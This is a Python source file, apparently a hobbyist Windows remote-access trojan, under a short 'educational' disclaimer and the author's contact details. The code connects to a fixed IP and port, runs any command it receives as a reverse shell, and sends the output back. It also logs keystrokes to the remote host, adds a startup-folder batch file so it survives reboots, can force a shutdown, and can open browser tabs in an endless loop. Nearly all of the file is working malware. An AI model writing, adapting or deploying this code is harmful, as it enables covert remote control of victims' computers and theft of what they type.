# legal disclamer:
#it's just for educational things
#test it just in system your have permissions to use that program
#rememenber, with powers come big responsabilitys. ass: Rossini135
#contact infos: 
#email: rossiniroberto52@gmail.com
#twitter: @rossin135
#github: https://github.com/rossiniroberto52
import socket, os, subprocess, webbrowser, shutil
import keyboard as key
from getpass import getuser
from pathlib import Path
from os import path
from sys import argv

#most used vars
USER = getuser()

#used PATHS:
temp_path = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER

def keylog(event):
    keys = []
    key = event.name
    keys.append(key)
    keyToSend = keys
    conn.send(str(keyToSend + ", ").encode("utf-8"))

def kill():
    os.system("msg %username% your system will be shutdown because i hack then :) lol")
    os.system("shutdown -s -t 3")

def clone():
    try:
        path_to_create = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
        if not os.path.exists(path_to_create):
            os.makedirs(path_to_create)
        fileToCopy = 'clt.exe'
        shutil.copy2(fileToCopy, path_to_create)
    except:
        msg = "error to create\copy...."
        conn.send(msg.encode("utf-8"))
        pass

def bat_create(file_path=""):
    if(file_path == ""):
        file_path = temp_path
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start /b %s\\clt.exe' % file_path)
        msg = "[+] .bat file created!"
        conn.send(msg.encode("utf-8"))

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(("192.168.0.15",6667))

while True:
    cmd = conn.recv(1024).decode('utf-8')
    if cmd == "exit":
        break
    if cmd == "kill":
        kill()
    if cmd == "troll":
        link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        os.system("msg %username% lol")
        while True:
            webbrowser.open_new(link)        
    if cmd == "stay":
        bat_create()
        clone()
        #re-start the server
    if cmd == "Kstay":
        bat_create()
        clone()
        kill()
        #re-start the server
    if cmd == "keylog":
        key.on_press(keylog)
        key.wait('esc')
# Kstay shutdown the sistem. stay dont shutdown
    os.system(cmd)
    output = subprocess.getoutput(cmd)
    conn.send(output.encode('utf-8'))
    os.system("cls")
conn.close()
exit()